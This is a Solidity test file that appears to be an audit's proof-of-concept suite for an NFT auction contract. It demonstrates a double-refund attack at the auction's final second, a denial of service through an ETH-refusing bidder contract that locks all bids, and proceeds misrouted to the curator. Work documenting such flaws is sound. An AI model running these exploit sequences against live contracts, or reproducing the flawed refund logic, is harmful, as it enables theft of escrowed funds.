// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {Gallery} from "../src/Gallery.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Art is ERC721("Art", "ART") {
    function mint(address to, uint256 id) external { _mint(to, id); }
}

// A bidder whose address refuses ETH.
contract Refuser {
    function bid(Gallery g, uint256 id) external payable { g.bid{value: msg.value}(id); }
}

contract GalleryProof is Proof {
    Art art;
    Gallery g;
    address curator = address(0xC0);
    address artist = address(0xA7);
    address mallory = address(0xBAD);
    address bob = address(0xB0B);
    address carol = address(0xCA);
    uint256 end;

    function setUp() public {
        vm.warp(1_000_000);
        art = new Art();
        vm.prank(curator);
        g = new Gallery(IERC721(address(art)));
        art.mint(artist, 1);
        art.mint(artist, 2);
        vm.prank(artist);
        art.setApprovalForAll(address(g), true);
        end = block.timestamp + 1 days;
        vm.startPrank(curator);
        g.list(1, end);
        g.list(2, end + 1 days);
        vm.stopPrank();
        vm.deal(mallory, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(carol, 10 ether);
    }

    // Issue 1: at block.timestamp == endTime both settle (>=) and cancel (<=) are open, and settle refunds
    // losing bids without zeroing them, so a losing bid is refunded twice, paid from other auctions' escrow.
    function test_issue1_endSecondOverlapRefundsTwice() public {
        vm.prank(carol);
        g.bid{value: 5 ether}(2);                     // carol's escrow for token 2
        vm.startPrank(mallory);
        g.bid{value: 3 ether}(1);
        g.bid{value: 3.1 ether}(1);                   // mallory is also the top bid
        vm.warp(end);                                 // the last second of auction 1
        g.settle(1);                                  // mallory wins, bid 0 refunded
        g.cancel(1, 0);                               // bid 0 refunded again
        vm.stopPrank();
        assertEq(art.ownerOf(1), mallory, "mallory has the token");
        assertEq(mallory.balance, 10 ether - 3.1 ether + 3 ether, "mallory's net cost is 0.1 ETH, not 3.1 ETH");
        assertLt(address(g).balance, 5 ether, "carol's 5 ETH escrow is no longer fully held");
        vm.warp(end + 1 days);
        vm.expectRevert();
        g.settle(2);                                  // carol's auction can no longer settle
    }

    // Control for issue 1: one second later, the same cancel is closed.
    function test_control_cancelClosedAfterEnd() public {
        vm.startPrank(mallory);
        g.bid{value: 3 ether}(1);
        g.bid{value: 3.1 ether}(1);
        vm.warp(end + 1);
        g.settle(1);
        vm.expectRevert();
        g.cancel(1, 0);
        vm.stopPrank();
    }

    // Issue 2: settle pushes a refund to every outbid bidder and requires each to succeed, so one bidder
    // that rejects ETH blocks settlement forever; after the end nobody can cancel, so every bid and the token are stuck.
    function test_issue2_oneRefusingBidderLocksTheAuction() public {
        Refuser r = new Refuser();
        r.bid{value: 0.01 ether}(g, 1);
        vm.prank(bob);
        g.bid{value: 2 ether}(1);
        vm.prank(carol);
        g.bid{value: 4 ether}(1);
        vm.warp(end + 1);
        vm.expectRevert();
        g.settle(1);
        vm.prank(bob);
        vm.expectRevert();
        g.cancel(1, 1);                               // bob's outbid 2 ETH cannot be recovered either
        assertEq(art.ownerOf(1), artist, "token never moves");
        assertEq(address(g).balance, 6.01 ether, "all bids stay locked in the contract");
    }

    // Issue 3: the winning bid is paid to the contract owner (the curator), not to the token's holder.
    function test_issue3_proceedsGoToOwnerNotHolder() public {
        vm.prank(bob);
        g.bid{value: 2 ether}(1);
        vm.warp(end + 1);
        g.settle(1);
        assertEq(art.ownerOf(1), bob, "artist's token went to the winner");
        assertEq(artist.balance, 0, "artist received nothing");
        assertEq(curator.balance, 2 ether, "the curator received the winning bid");
    }
}
